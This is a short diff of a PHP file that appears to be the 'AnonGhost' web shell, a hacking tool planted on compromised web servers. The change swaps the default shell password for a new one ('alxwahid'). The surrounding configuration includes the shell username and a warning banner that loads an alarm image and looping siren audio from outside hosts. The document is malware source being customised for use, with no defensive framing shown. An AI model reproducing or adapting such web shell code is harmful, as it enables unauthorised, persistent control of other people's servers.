@@ -10,7 +10,7 @@ error_reporting(E_ERROR | E_PARSE);
 // global configs
 
 $username="AnonGhost";
-$password="AnonGhost"; // shell password, change it, max 50 chars
+$password="alxwahid"; // shell password, change it, max 50 chars
 $warn="<center><img src='http://mfs1.cdnsw.com/fs/Nouveau_dossier/6qyet-alarme.gif'   height='150px' width='150px'/></center><br>
 <audio autoplay loop > <source src=\"http://soundbible.com/mp3/Red%20Alert-SoundBible.com-108009997.mp3\" type=\"audio/mpeg\"></audio>";
 $about = "<style type=\"text/css\">body { background-color:#222222; color: rgb(0, 119, 0); text-align: center } a{text-decoration:none; font-family: Tahoma, Geneva; color:#007700; padding:2px 2px;}
